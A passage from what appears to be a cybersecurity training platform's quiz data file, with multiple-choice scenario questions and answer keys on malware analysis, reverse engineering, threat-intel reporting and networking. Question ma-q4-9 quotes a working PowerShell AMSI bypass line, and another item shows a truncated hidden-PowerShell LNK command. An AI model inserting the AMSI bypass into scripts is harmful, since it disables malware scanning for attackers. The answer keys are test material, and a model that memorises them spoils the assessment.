          "Auto-executing macro downloader — opens on document open, fetches a second stage, and executes it",
          "Digital signature",
          "Mail merge"
        ],
        correctAnswer: 1,
        explanation: "AutoOpen/Document_Open + download + Shell is the classic macro-dropper chain."
      },
      {
        id: "ma-q4-5",
        difficulty: "medium",
        tags: ["HTML Smuggling"],
        scenario: "A phishing email links to an HTML page. Opening it in a browser reassembles a Base64 blob in JavaScript and offers the user a ZIP to save — the payload never traversed the proxy as an executable.",
        question: "Technique name?",
        options: [
          "Reflected XSS",
          "HTML Smuggling (T1027.006) — client-side reassembly bypasses content inspection at the perimeter",
          "SQL Injection",
          "Server-side template injection"
        ],
        correctAnswer: 1,
        explanation: "HTML smuggling delivers payloads by constructing them in-browser from encoded strings, bypassing gateway file-type controls."
      },
      {
        id: "ma-q4-6",
        difficulty: "medium",
        tags: ["LNK"],
        scenario: "A ZIP contains `Report.pdf.lnk`. LECmd shows the target is `%SystemRoot%\\System32\\cmd.exe /c powershell -w hidden -c ...`.",
        question: "What is the malicious shortcut abusing?",
        options: [
          "Nothing — LNK is harmless",
          "Weaponised shortcut executes PowerShell/cmd while displaying a PDF-like name and icon; standard 2022+ initial-access vector",
          "Windows update path",
          "PDF rendering bug"
        ],
        correctAnswer: 1,
        explanation: "Post-macro-crackdown, LNKs became the go-to first-stage — they can run arbitrary commands while looking like documents."
      },
      {
        id: "ma-q4-7",
        difficulty: "hard",
        tags: ["ViperMonkey"],
        scenario: "The VBA is heavily obfuscated with `Chr()` chains and dynamic string building; olevba prints noise. You need to see the effective commands and URLs.",
        question: "Best next tool?",
        options: [
          "Manual grep",
          "ViperMonkey (or oletools' `mraptor` + emulation) — emulate the VBA to resolve dynamic strings and expose IOCs",
          "Compile with VBA IDE",
          "Detonate in Word"
        ],
        correctAnswer: 1,
        explanation: "ViperMonkey emulates VBA execution and prints deobfuscated strings — ideal for macros hiding IOCs behind arithmetic."
      },
      {
        id: "ma-q4-8",
        difficulty: "hard",
        tags: ["PDF JS"],
        scenario: "pdf-parser dumps a compressed `/JS` stream. After `zlib`-inflate it contains `unescape('%75...')` and `app.launchURL(...)` calls.",
        question: "What is happening?",
        options: [
          "Standard form validation",
          "JavaScript-based exploit / redirector staged inside the PDF; deobfuscate the unescape payload and enumerate URLs as IOCs",
          "Digital signature",
          "Font subsetting"
        ],
        correctAnswer: 1,
        explanation: "Compressed obfuscated JS in a PDF is a classic delivery pattern — decode and extract URLs, shellcode, or CVE targets."
      },
      {
        id: "ma-q4-9",
        difficulty: "hard",
        tags: ["AMSI"],
        scenario: "PowerShell payload contains `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`.",
        question: "What is this?",
        options: [
          "Benign reflection",
          "AMSI bypass — disables in-memory script scanning so later stages run undetected; strong malicious indicator",
          "Just error handling",
          "PSReadLine config"
        ],
        correctAnswer: 1,
        explanation: "Setting `amsiInitFailed` disables AMSI scanning in the current process — a well-known offensive primitive."
      },
      {
        id: "ma-q4-10",
        difficulty: "hard",
        tags: ["Container Formats"],
        scenario: "Recent campaigns deliver `.iso`, `.img`, `.vhd` attachments containing an LNK and a hidden DLL.",
        question: "Why this container choice?",
        options: [
          "Larger files bypass AV",
          "Mounted volumes bypass Mark-of-the-Web on inner files, so SmartScreen/Protected View do not fire — key initial-access evasion",
          "ISO files auto-execute",
          "Random preference"
        ],
        correctAnswer: 1,
        explanation: "MOTW is not propagated onto files inside mounted ISO/IMG/VHD volumes on older configurations, defeating a critical safety net."
      }
    ]
  },
  {
    quizId: "ma-q5",
    courseId: "malware-analysis",
    title: "Reverse Engineering Fundamentals",
    description: "Scenario-based mastery of x86 basics, Ghidra, debugging, and C2 protocol RE.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      {
        id: "ma-q5-1",
        difficulty: "easy",
        tags: ["x86", "Calling Convention"],
        scenario: "In a 32-bit stdcall function you see arguments pushed right-to-left, then `call`, and the callee ends with `ret 0Ch`.",
        question: "What does `ret 0Ch` tell you?",
        options: [
          "The function returned 12",
          "Callee cleans 12 bytes (3 args) from the stack — confirms stdcall",
          "Ret failed",
          "Compiler error"
        ],
        correctAnswer: 1,
        explanation: "`ret N` pops N bytes after returning — characteristic of stdcall where the callee cleans the stack."
      },
      {
        id: "ma-q5-2",
        difficulty: "easy",
        tags: ["Ghidra"],
        scenario: "You right-click a function in Ghidra and want to see every location that calls it.",
        question: "Which feature helps?",
        options: [
          "Byte viewer",
          "References → Show References to (cross-references)",
          "Bookmarks",
          "Comment listing"
        ],
        correctAnswer: 1,
        explanation: "Xrefs are the RE workhorse for navigating call graphs and understanding how a function is used."
      },
      {
        id: "ma-q5-3",
        difficulty: "medium",
        tags: ["Decompiler"],
        scenario: "Ghidra's decompiler shows a loop XOR-ing each byte of a buffer with `0x37` before a `send` call.",
        question: "What is the buffer's purpose?",
        options: [
          "Random noise",
          "Trivially obfuscated C2 payload — recover plaintext by XOR 0x37 offline and treat 0x37 as a family IOC",
          "Compression",
          "Hashing"
        ],
        correctAnswer: 1,
        explanation: "Single-byte XOR is one of the most common lightweight C2 obfuscations; recognising it turns opaque traffic into readable protocol."
      },
      {
        id: "ma-q5-4",
        difficulty: "medium",
        tags: ["Breakpoints"],
        scenario: "You want to break the instant the unpacked code runs, without stepping through the unpack stub instruction-by-instruction.",
        question: "Best breakpoint strategy?",
        options: [
          "Software BP at entry point",
          "Memory-access breakpoint on the newly allocated RWX region (or hardware BP on the tail-jump target)",
          "Break on every syscall",
          "Break on ExitProcess"
        ],
        correctAnswer: 1,
        explanation: "RWX memory pages allocated at runtime almost always host the unpacked code; breaking on execute of that region catches OEP cleanly."
      },
      {
        id: "ma-q5-5",
        difficulty: "medium",
        tags: ["API Hashing"],
        scenario: "Instead of import strings, the sample loops modules in the PEB, hashes each export name, and compares against constants like `0x726774c` .",
        question: "What is this and how do you resolve it?",
        options: [
          "Random noise",
          "API hashing — recover API names by hashing exports of common DLLs with the same algorithm and matching constants (or use Capa/HashDB)",
          "String obfuscation",
          "Compiler bug"
        ],
        correctAnswer: 1,
        explanation: "API hashing hides imports from static analysis. Tools like HashDB reverse the constants to API names quickly."
      },
      {
        id: "ma-q5-6",
        difficulty: "medium",
        tags: ["DGA"],
        scenario: "The sample seeds a PRNG from the current UTC date and generates 128 domain candidates per day under `.top` and `.xyz`.",
        question: "What is this and what is the operational value?",
        options: [
          "Random typos",
          "Domain Generation Algorithm — RE the seed/algorithm to pre-compute domains and sinkhole/block ahead of the actor",
          "DNS bug",
          "CDN behaviour"
        ],
        correctAnswer: 1,
        explanation: "Reversing DGAs lets defenders pre-register or block domains before the actor uses them — high-value defensive output."
      },
      {
        id: "ma-q5-7",
        difficulty: "hard",
        tags: ["Custom Crypto"],
        scenario: "RE reveals a modified RC4 keystream (extra rotation step) used to encrypt C2 traffic.",
        question: "Best analytic path to a decryptor?",
        options: [
          "Give up",
          "Port the exact algorithm from the disassembly to Python, extract the key from the sample or handshake, and decrypt captured PCAP",
          "Try AES first",
          "Brute-force MD5"
        ],
        correctAnswer: 1,
        explanation: "Custom crypto is usually still deterministic; reimplement precisely, recover the key, and decrypt collected traffic."
      },
      {
        id: "ma-q5-8",
        difficulty: "hard",
        tags: ["Config Extraction"],
        scenario: "You want automated, at-scale extraction of C2 URLs, campaign IDs, and mutex names from every future build of this family.",
        question: "Best deliverable?",
        options: [
          "Manual analysis every time",
          "A config extractor script (e.g., Python with pefile/unicorn) plus a YARA rule to trigger it — feeds intel automatically",
          "Post on Twitter",
          "Only track hashes"
        ],
        correctAnswer: 1,
        explanation: "Family-level config extractors + YARA are the durable RE output that scales into TI and detection pipelines."
      },
      {
        id: "ma-q5-9",
        difficulty: "hard",
        tags: ["Anti-Debug"],
        scenario: "`INT 2Dh` inside a `__try` block causes the debugger to catch an exception the malware expects the OS to handle silently.",
        question: "What is this and the mitigation?",
        options: [
          "Compiler artefact",
          "Anti-debug via structured exception handling — pass the exception to the app or use ScyllaHide's SEH options",
          "Random opcode",
          "Interrupt vector table"
        ],
        correctAnswer: 1,
        explanation: "Debuggers change how exceptions surface. Malware weaponises this; pass-through or plugin mitigation is required."
      },
      {
        id: "ma-q5-10",
        difficulty: "hard",
        tags: ["Rich Header"],
        scenario: "During attribution work you notice two families share an identical Rich Header @Comp.ID sequence though they otherwise look different.",
        question: "What can you responsibly infer?",
        options: [
          "Same author for sure",
          "Shared build environment (same Visual Studio toolchain + libs) — a strong campaign/cluster pivot, not conclusive attribution",
          "Random",
          "One copied the header on purpose (never happens)"
        ],
        correctAnswer: 1,
        explanation: "Rich Header collisions imply shared toolchains and are excellent clustering pivots; attribution needs corroborating evidence."
      }
    ]
  },
  {
    quizId: "ma-q6",
    courseId: "malware-analysis",
    title: "Reporting & Threat Intelligence",
    description: "Scenario-based mastery of IOC extraction, YARA, reporting, and attribution.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      {
        id: "ma-q6-1",
        difficulty: "easy",
        tags: ["IOCs"],
        scenario: "Analysis is complete and you must hand SOC something actionable within the hour.",
        question: "Which minimum set do you ship first?",
        options: [
          "A screenshot of Ghidra",
          "SHA256, C2 domains/IPs/URLs, mutex names, key registry paths — as a machine-readable list (CSV/STIX/MISP)",
          "The whole Ghidra project",
          "A blog post"
        ],
        correctAnswer: 1,
        explanation: "Fast IOC delivery in a machine-readable format is the first defender need — everything else can follow."
      },
      {
        id: "ma-q6-2",
        difficulty: "easy",
        tags: ["YARA"],
        scenario: "You extract three unique 24-byte constant strings and a distinctive imphash from the sample.",
        question: "How should a durable YARA rule combine them?",
        options: [
          "Match any single string",
          "AND the three strings inside a section-size/PE condition — reduce false positives while keeping family coverage",
          "Match on file size only",
          "Match on filename"
        ],
        correctAnswer: 1,
        explanation: "Combining multiple discriminative strings with structural conditions gives durable, low-FP family rules."
      },
      {
        id: "ma-q6-3",
        difficulty: "medium",
        tags: ["Report Structure"],
        scenario: "You are writing the analysis report for a mixed audience: SOC, IR lead, and the CISO.",
        question: "Best structure?",
        options: [
          "One long chronological log",
          "Executive summary → Impact/scope → IOCs → Behaviour → ATT&CK mapping → Detections/hunts → Appendices",
          "Only assembly listings",
          "Only screenshots"
        ],
        correctAnswer: 1,
        explanation: "Layered structure lets each reader stop where their need is met while preserving technical depth in appendices."
      },
      {
        id: "ma-q6-4",
        difficulty: "medium",
        tags: ["STIX", "TAXII"],
        scenario: "You must push IOCs to a partner ISAC in a format their platform will ingest automatically.",
        question: "Standard to use?",
        options: [
          "PDF only",
          "STIX 2.1 objects (Indicator, Malware, Relationship) delivered over TAXII 2.1",
          "Word document",
          "Facebook post"
        ],
        correctAnswer: 1,
        explanation: "STIX/TAXII is the industry standard for machine-readable intel exchange across ISACs and MISP/TIP tooling."
      },
      {
        id: "ma-q6-5",
        difficulty: "medium",
        tags: ["ATT&CK Mapping"],
        scenario: "Sample uses PowerShell with encoded commands, creates a Run key, and injects code into explorer.exe.",
        question: "Correct ATT&CK mapping?",
        options: [
          "T1059.001 (PowerShell) + T1547.001 (Run Keys) + T1055 (Process Injection)",
          "T1078 only",
          "T1190 only",
          "No mapping needed"
        ],
        correctAnswer: 0,
        explanation: "Accurate technique tagging (with sub-techniques) drives coverage analysis, detection engineering, and executive reporting."
      },
      {
        id: "ma-q6-6",
        difficulty: "medium",
        tags: ["IOC Quality"],
        scenario: "Peer wants you to publish a shared-hosting IP (`104.21.x.x`, CDN) as a blocklist IOC.",
        question: "How do you push back?",
        options: [
          "Publish it — more is better",
          "CDN/shared-hosting IPs are low-fidelity and cause outages; publish the domain/URL/JA3 or scope the IP tightly with time/context",
          "Publish IP and block CDN entirely",
          "Ignore and publish"
        ],
        correctAnswer: 1,
        explanation: "IOC quality > quantity. Shared-hosting IPs generate collateral damage; higher-fidelity artefacts are safer."
      },
      {
        id: "ma-q6-7",
        difficulty: "hard",
        tags: ["Attribution"],
        scenario: "You want to link this campaign to a known actor. You have: shared C2 infra, code overlap with a prior kit, and identical operator TTPs, but no confession.",
        question: "How do you word attribution?",
        options: [
          "Definitive attribution to Group X",
          "Assess with moderate/high confidence overlap with Group X's tradecraft, listing the concrete overlaps and the caveats (false-flag potential, tooling reuse)",
          "Refuse to attribute",
          "Blame a nation-state"
        ],
        correctAnswer: 1,
        explanation: "Analytic Standards (ICD 203) call for confidence-scored language with sourcing — never absolutes on partial evidence."
      },
      {
        id: "ma-q6-8",
        difficulty: "hard",
        tags: ["YARA — FPs"],
        scenario: "Your YARA rule fires against Notepad++, Sysinternals, and Steam updates.",
        question: "Root cause and fix?",
        options: [
          "YARA is broken",
          "Strings are too generic (RTL library / installer boilerplate); tighten conditions with PE metadata, section entropy, and multi-string AND",
          "Delete the rule",
          "Raise the severity"
        ],
        correctAnswer: 1,
        explanation: "FP cascades usually mean the strings match compiler/runtime artefacts. Add structural conditions and combine multiple unique strings."
      },
      {
        id: "ma-q6-9",
        difficulty: "hard",
        tags: ["Diamond Model"],
        scenario: "You need a compact model to describe the intrusion for the intel report: who, using what, targeting whom, over which infrastructure.",
        question: "Which framework fits?",
        options: [
          "OWASP Top 10",
          "The Diamond Model of Intrusion Analysis (Adversary, Capability, Infrastructure, Victim)",
          "PCI DSS",
          "ISO 27001"
        ],
        correctAnswer: 1,
        explanation: "The Diamond Model is the canonical intel structure and pairs well with ATT&CK for reporting."
      },
      {
        id: "ma-q6-10",
        difficulty: "hard",
        tags: ["TLP"],
        scenario: "Your report contains partner-provided samples and identifies a victim. You need to share with the sector ISAC but not the open community.",
        question: "Correct handling marking?",
        options: [
          "TLP:CLEAR",
          "TLP:AMBER (or AMBER+STRICT) — restricted to member organisations on a need-to-know basis",
          "TLP:GREEN publicly",
          "No marking needed"
        ],
        correctAnswer: 1,
        explanation: "TLP:AMBER limits sharing to members of an organisation/community on a need-to-know basis, protecting victim/source data."
      }
    ]
  },
  // MALWARE ANALYSIS FUNDAMENTALS — FINAL CERTIFICATION EXAM
  {
    quizId: "ma-q7",
    courseId: "malware-analysis",
    title: "Malware Analysis Certification Exam",
    description: "Comprehensive final exam covering all 6 modules. You must pass with 80% or higher to earn your Malware Analysis Fundamentals certificate.",
    passingScore: 80,
    timeLimit: 60,
    questions: [
      { id: "ma-q7-1", question: "What is the difference between a virus and a worm?", options: ["They are functionally identical malware types that both spread without any user assistance needed", "A virus requires a host file to propagate; a worm self-propagates independently across networks", "Worms are far less dangerous than viruses because worms do not modify or corrupt target files", "Viruses only target and corrupt Microsoft Office documents while worms attack executable binaries"], correctAnswer: 1, explanation: "Viruses attach to and modify host files to spread. Worms are standalone programs that self-replicate across networks without needing a host file." },
      { id: "ma-q7-2", question: "Why is FlareVM preferred over a standard Windows VM for malware analysis?", options: ["It is available for free download, unlike enterprise-grade analysis platforms that require licensing fees", "Pre-configured with analysis tools (debuggers, disassemblers, PE tools) and security settings for safe analysis", "FlareVM delivers significantly better virtual CPU and RAM performance than standard Windows installations", "FlareVM is an official Microsoft product included with enterprise Windows Server licensing agreements"], correctAnswer: 1, explanation: "FlareVM comes pre-installed with tools like x64dbg, Ghidra, PEStudio, YARA, and is configured with analysis-friendly settings and disabled security features." },
      { id: "ma-q7-3", question: "What is the FIRST step when you receive a malware sample for analysis?", options: ["Execute the sample immediately in the VM to observe its live behavior before doing any static work", "Hash the sample (MD5, SHA-256) and check against threat intel databases like VirusTotal first", "Load the sample directly into Ghidra for disassembly and decompilation without checking reputation", "Delete the sample immediately and request a clean copy from the original source to avoid risk"], correctAnswer: 1, explanation: "Always hash first — if the sample is known, existing analysis saves time. Check VirusTotal, MalwareBazaar, and internal threat intel before spending analysis effort." },
      { id: "ma-q7-4", question: "What does the 'strings' command reveal during static analysis?", options: ["Only file system metadata like file size, timestamps, and permission attributes of the binary", "Human-readable text embedded in the binary: URLs, IPs, registry keys, error messages, and API names", "The complete internal PE file structure including section headers and the full import table listing", "Symmetric encryption keys used by the malware for C2 communication and payload decryption routines"], correctAnswer: 1, explanation: "Strings extraction reveals embedded text indicators: C2 URLs, file paths, registry keys, API names, error strings, and sometimes hardcoded credentials." },
      { id: "ma-q7-5", question: "What is a PE file's Import Address Table (IAT) and why is it important for analysis?", options: ["A runtime memory allocation table tracking heap allocations made during the process's execution", "Lists external DLL functions the binary calls — reveals capabilities like file I/O, networking, and crypto", "A binary compression lookup table used by the PE loader to restore packed sections to memory", "A Windows debugging feature populating symbol names from PDB files to aid crash investigation"], correctAnswer: 1, explanation: "The IAT shows which API functions the binary imports — CreateFile, InternetOpenUrl, CryptEncrypt reveal file access, network, and encryption capabilities." },
      { id: "ma-q7-6", question: "What is 'packing' in the context of malware?", options: ["Compressing malware attachments into ZIP archives for delivery as phishing email attachments", "Compressing and/or encrypting the binary to hide its true code and evade static analysis tools", "Bundling multiple independent malware components into a single container dropper installer file", "Adding or modifying binary metadata fields like timestamps and version strings to deceive analysts"], correctAnswer: 1, explanation: "Packers compress/encrypt the executable code. At runtime, a stub unpacks the original code into memory — this defeats static string and import analysis." },
      { id: "ma-q7-7", question: "How do you identify if a PE file is packed?", options: ["Check the binary filename for known packer names like 'upx_packed.exe' or 'themida_protected.exe'", "High entropy in sections, few imports, small IAT, packer signatures, and unusual section name anomalies", "Compare the file size in bytes against a database of known unpacked malware family size ranges", "Execute the binary and observe its behavior to determine if it runs an unpacking stub at startup"], correctAnswer: 1, explanation: "Packed indicators: high section entropy (>7.0), very few imports (just LoadLibrary/GetProcAddress), unusual section names (.upx, .packed), and small code sections." },
      { id: "ma-q7-8", question: "During dynamic analysis, what does ProcMon capture?", options: ["Raw network packet captures including all TCP/UDP payload data transmitted during malware execution", "Real-time file system, registry, process, and thread activity with full stack traces and timestamps", "Physical RAM memory dumps of the infected process for offline forensic memory analysis workflows", "Only DNS query and response traffic from the malware process to identify C2 domain lookups"], correctAnswer: 1, explanation: "Process Monitor captures granular system activity: file creates/reads/writes, registry modifications, process/thread creation, and network connections with stack traces." },
      { id: "ma-q7-9", question: "What is API hooking in dynamic analysis?", options: ["Directly calling Windows API functions from the analysis harness to trigger specific malware code paths", "Intercepting API calls to monitor what functions malware invokes and with what parameters at runtime", "A standard software engineering pattern used to extend third-party library functionality in plugins", "Disabling specific Windows API functions to prevent malware from carrying out destructive operations"], correctAnswer: 1, explanation: "API hooking intercepts function calls (CreateFile, WriteProcessMemory, InternetConnect) to log parameters and behavior without modifying the malware." },
      { id: "ma-q7-10", question: "A malware sample checks for 'vmtoolsd.exe' and 'VBoxService.exe' processes. What is it doing?", options: ["Checking for Windows Update service processes to avoid running while system patches are downloading", "VM detection — anti-analysis technique to detect virtual machine environments and alter its behavior", "Scanning for security software processes like AV and EDR to decide whether to proceed with infection", "Searching for specific target process dependencies needed to inject its shellcode into a host process"], correctAnswer: 1, explanation: "Checking for VM-specific processes is a common anti-analysis technique. If detected, malware may exit, sleep, or behave benignly to evade sandbox analysis." },
      { id: "ma-q7-11", question: "What is the purpose of a sandbox in malware analysis?", options: ["A secure storage system for archiving malware samples and maintaining an indexed threat repository", "An automated dynamic execution environment that monitors behavior and generates analysis reports", "A secure IDE environment for writing and testing custom malware analysis and detection scripts", "A network-only isolation zone that blocks external connections while allowing internal host access"], correctAnswer: 1, explanation: "Sandboxes (Cuckoo, ANY.RUN, Joe Sandbox) automatically execute malware in isolated environments, monitoring all activity and generating behavioral reports." },
      { id: "ma-q7-12", question: "How do VBA macros typically deliver malware payloads?", options: ["By directly writing shellcode into executable memory sections of the Office host process immediately", "Auto_Open macros use PowerShell, WScript, or certutil to download and execute payloads from C2 servers", "By transmitting credentials captured from the Office application directly to attacker-controlled servers", "Payloads are delivered exclusively via DNS TXT record queries resolved by the macro at execution time"], correctAnswer: 1, explanation: "Malicious macros trigger on document open, then use shell commands (PowerShell, WScript) to download second-stage payloads from attacker-controlled servers." },
      { id: "ma-q7-13", question: "What is 'code injection' and name two common techniques?", options: ["Writing and compiling new detection code inside an IDE to analyze malware behavior patterns", "Inserting code into another process's memory space — DLL injection and process hollowing are common", "A web application security vulnerability class that includes SQLi and XSS attack injection patterns", "Embedding malicious HTML payloads into email bodies to execute JavaScript in victim email clients"], correctAnswer: 1, explanation: "Code injection inserts malicious code into legitimate processes. DLL injection loads a malicious DLL; process hollowing replaces a suspended process's code." },
      { id: "ma-q7-14", question: "In x86 assembly, what does 'CALL' instruction do?", options: ["Terminates the currently running program and returns control to the operating system process manager", "Pushes the return address onto the stack and transfers execution to the target function address", "Dynamically allocates a specified number of bytes on the heap for temporary buffer storage use", "Compares two register values and sets the CPU status flags for subsequent conditional branch testing"], correctAnswer: 1, explanation: "CALL pushes EIP (next instruction address) onto the stack as return address, then jumps to the target function. RET pops the address to return." },
      { id: "ma-q7-15", question: "What is Ghidra's decompiler useful for?", options: ["Compiling analyzed assembly back into optimized native machine code for performance benchmarking", "Converting assembly instructions back to approximate C/C++ source code for much easier analysis", "Capturing live network traffic during dynamic analysis to reconstruct the malware's C2 protocol", "Automated runtime debugging of compiled binaries with built-in breakpoint and stepping functionality"], correctAnswer: 1, explanation: "Ghidra's decompiler translates disassembly into pseudo-C code, making it much easier to understand program logic without reading raw assembly." },
      { id: "ma-q7-16", question: "What is the purpose of setting breakpoints in a debugger during malware analysis?", options: ["Permanently halting malware execution to prevent any further destructive actions on the system", "Pausing execution at specific addresses to inspect memory, registers, and variable values at that point", "Injecting additional code bytes into the running process to redirect execution to an analysis hook", "Intercepting all outbound network connection attempts to capture C2 protocol traffic for examination"], correctAnswer: 1, explanation: "Breakpoints pause execution so you can examine the current state — register values, memory contents, stack — crucial for understanding malware behavior." },
      { id: "ma-q7-17", question: "How does ransomware typically encrypt files?", options: ["Using simple single-byte XOR encryption applied to each file with a hardcoded key in the binary", "Hybrid encryption: symmetric AES encrypts files, then asymmetric RSA encrypts the symmetric key", "Applying ROT13 character substitution cipher encoding to each file's raw byte content on disk", "Encoding file contents using Base64 encoding and appending a ransom note to each modified file"], correctAnswer: 1, explanation: "Ransomware uses hybrid encryption for speed: AES encrypts each file quickly, then RSA encrypts the AES key — only the attacker's RSA private key can decrypt." },
      { id: "ma-q7-18", question: "What is a YARA rule's 'meta' section used for?", options: ["Defining the boolean logic conditions that determine when a file matches the YARA signature rule", "Storing descriptive metadata: author, date, description, threat level, malware family, and references", "Listing all filesystem paths and directories that the YARA scanner should search during a scan run", "Configuring the scanner performance options and threading parameters for production deployment\n"], correctAnswer: 1, explanation: "The meta section stores rule metadata for documentation — author, creation date, malware family, description, references, and severity classification." },
      { id: "ma-q7-19", question: "What is 'process hollowing'?", options: ["A technique for deleting a running process's executable file from disk while it remains in memory", "Creating a suspended legitimate process, unmapping its code, and injecting malicious code in its place", "A memory leak condition where a process gradually loses access to all of its allocated heap memory", "A standard Windows process lifecycle event where a process terminates and cleans up all its resources"], correctAnswer: 1, explanation: "Process hollowing creates a suspended legitimate process (e.g., svchost.exe), hollows out its code section, writes malicious code, and resumes — masquerading as legitimate." },
      { id: "ma-q7-20", question: "How do you safely extract IOCs from a malware sample?", options: ["Execute the sample directly on a production system and use SIEM to collect all generated telemetry", "Use static analysis tools in an isolated VM to extract strings, hashes, embedded URLs, and C2 infrastructure", "Submit the hash to the malware author's support channel and request a list of indicators directly", "Use only VirusTotal's community-submitted detection rules and skip any local analysis entirely"], correctAnswer: 1, explanation: "In an isolated analysis VM: extract strings, decode encoded data, parse PE resources, and collect hashes, IPs, domains, URLs, mutexes, and registry keys." },
      { id: "ma-q7-21", question: "What is the significance of the PE file's timestamp?", options: ["Records the exact time the malware file was downloaded to the victim's machine from the internet", "The compilation timestamp indicating when the malware was built, though it is commonly forged by actors", "Stores the filesystem creation time that Windows assigned when the file was first written to disk", "Records the date and time the file was first submitted to VirusTotal for multi-engine scanning"], correctAnswer: 1, explanation: "The PE timestamp shows compilation time, helping estimate creation date and correlate with campaigns. However, sophisticated actors routinely forge this value." },
      { id: "ma-q7-22", question: "What technique do malware authors use to make reverse engineering harder?", options: ["Writing clean, well-documented code with descriptive function names to mislead analysis tools", "Code obfuscation: dead code insertion, control flow flattening, string encryption, and anti-debug tricks", "Releasing the malware as open-source code so defenders waste time analyzing decoy repositories", "Adding detailed inline comments and variable descriptions to confuse automated code analysis tools"], correctAnswer: 1, explanation: "Obfuscation techniques include junk code insertion, opaque predicates, string encryption, API hashing, and anti-debug checks to slow reverse engineering." },
      { id: "ma-q7-23", question: "What is a mutex in malware behavior and why do analysts care about it?", options: ["A proprietary binary container file format used for packaging and distributing malware components", "A named synchronization object — malware creates unique mutexes to prevent multiple instances, useful as IOCs", "A network socket protocol used for establishing secure encrypted tunnels between malware and its C2", "A cryptographic algorithm variant used to generate pseudo-random keys for per-file encryption operations"], correctAnswer: 1, explanation: "Malware creates named mutexes to ensure single execution. These unique names serve as reliable IOCs for detection and can identify malware families." },
      { id: "ma-q7-24", question: "How does a rootkit differ from a standard trojan?", options: ["Rootkits are significantly less dangerous because they only passively monitor rather than modify systems", "Rootkits operate at kernel level or below, actively hiding their presence from the OS and security tools", "Rootkits and trojans are completely identical malware types with no functional or architectural difference", "Rootkits exclusively target Linux systems, while trojans are the only malware type targeting Windows\n"], correctAnswer: 1, explanation: "Rootkits modify the OS kernel or boot process to actively conceal malware presence — hiding processes, files, network connections from standard tools." },
      { id: "ma-q7-25", question: "What is the MITRE ATT&CK technique ID for 'Command and Scripting Interpreter: PowerShell'?", options: ["T1059.001 — PowerShell under Command and Scripting Interpreter, one of the most abused execution techniques", "T1053.005 — Scheduled Task/Job: Scheduled Task, for persistence via Windows Task Scheduler mechanisms", "T1547.001 — Registry Run Keys/Startup Folder, a registry-based persistence and privilege escalation technique", "T1055.012 — Process Injection: Process Hollowing, used to inject code into suspended legitimate processes"], correctAnswer: 0, explanation: "T1059.001 is the sub-technique for PowerShell under Command and Scripting Interpreter — one of the most commonly observed execution techniques." },
      { id: "ma-q7-26", question: "During analysis, you find the malware creates a service named 'WindowsUpdateSvc'. What technique is this?", options: ["A legitimate Windows Update operation that installs security patches and hotfixes on the system", "Persistence via Windows Service creation (T1543.003) using a name mimicking a legitimate Windows service", "A service discovery scan attempting to enumerate all registered Windows services on the local system", "Process injection into the Windows Update service process to steal its permissions and session token"], correctAnswer: 1, explanation: "Creating services with names mimicking legitimate Windows services is a common persistence technique (T1543.003) — provides automatic startup and SYSTEM privileges." },
      { id: "ma-q7-27", question: "What is the best approach for analyzing a multi-stage malware dropper?", options: ["Analyze only the initial dropper binary and assume the second stage behaves identically to it", "Analyze each stage separately: initial dropper, downloaded payload, and final payload with full IOC capture", "Skip all intermediate stages and focus exclusively on the final payload that performs the main action", "Execute the entire chain once in the sandbox and collect all data in a single automated analysis pass"], correctAnswer: 1, explanation: "Multi-stage malware requires analyzing each stage independently — each may have different C2s, techniques, and IOCs that are crucial for complete understanding." },
      { id: "ma-q7-28", question: "What does 'behavioral analysis' reveal that static analysis cannot?", options: ["The static file metadata attributes like file size, compilation timestamp, and code section entropy values", "Runtime behavior: actual C2 communication, decrypted strings, unpacked code, and real-time system changes", "The full import table listing all Windows API functions referenced in the binary's PE header section", "The exact file size in bytes of the binary stored on disk before it is loaded into memory by the loader"], correctAnswer: 1, explanation: "Dynamic/behavioral analysis reveals what actually happens at runtime — decrypted configurations, real C2 traffic, dropped files, and evasion technique triggers." },
      { id: "ma-q7-29", question: "How should a malware analysis report be structured for maximum SOC value?", options: ["Include only low-level technical assembly analysis with register states and stack frame diagrams", "Executive summary, IOCs (hashes, IPs, domains), behavioral indicators, ATT&CK mapping, and detections", "Simply list all discovered IOC values without any contextual explanation or recommended response actions", "Provide only visual screenshots of the analysis VM and sandbox output without written explanation"], correctAnswer: 1, explanation: "Effective reports include: summary for leadership, actionable IOCs for blocking, behavioral indicators for detection, ATT&CK mapping for context, and recommendations." },
      { id: "ma-q7-30", question: "You analyze a sample that checks the system language and exits if it's Russian, Ukrainian, or Kazakh. What does this indicate?", options: ["A legitimate software localization feature ensuring the application runs correctly on multilingual systems", "Likely an Eastern European cybercrime group avoiding prosecution by geofencing CIS country targets", "A translation module error where incorrect locale detection causes the program to exit unexpectedly", "Completely random conditional behavior with no deliberate intent behind the language-based exit logic"], correctAnswer: 1, explanation: "Many Eastern European cybercrime groups avoid targeting CIS nations to reduce law enforcement attention — language/locale checks are a common geofencing technique." }
    ]
  },
  // ==========================================
  // NETWORK FUNDAMENTALS QUIZZES — scenario-based upgrade
  // ==========================================
  {
    quizId: "nf-q1",
    courseId: "network-fundamentals",
    title: "Computer Networks Basics",
    description: "Scenario-based mastery of network types, topologies, and architecture from a SOC perspective.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "nf-q1-1", difficulty: "easy", tags: ["Topology", "Availability"], scenario: "A branch office loses all connectivity when a single central switch reboots for a firmware update. Every desktop, printer, and AP goes dark simultaneously.", question: "Which physical topology best matches this failure pattern?", options: ["Full mesh", "Star", "Ring", "Bus"], correctAnswer: 1, explanation: "A single central switch that takes down every node when it fails is the defining failure mode of a star topology." },
      { id: "nf-q1-2", difficulty: "easy", tags: ["Network Types"], scenario: "You're triaging an alert on a laptop that pivoted from a corporate site in Berlin to a data center in Singapore over the company's own private links.", question: "Which network type spans that private path?", options: ["PAN", "LAN", "MAN", "WAN"], correctAnswer: 3, explanation: "A private, geographically distributed corporate backbone connecting sites in different regions is a WAN." },
      { id: "nf-q1-3", difficulty: "medium", tags: ["Topology", "Redundancy"], scenario: "An ICS design team wants a fabric where a single cable cut cannot isolate any node. Cost is secondary to uptime.", question: "Which topology should you recommend?", options: ["Bus", "Star", "Full mesh", "Ring (single direction)"], correctAnswer: 2, explanation: "Full mesh gives every node an alternate path when any single link fails, at the cost of cabling and ports." },
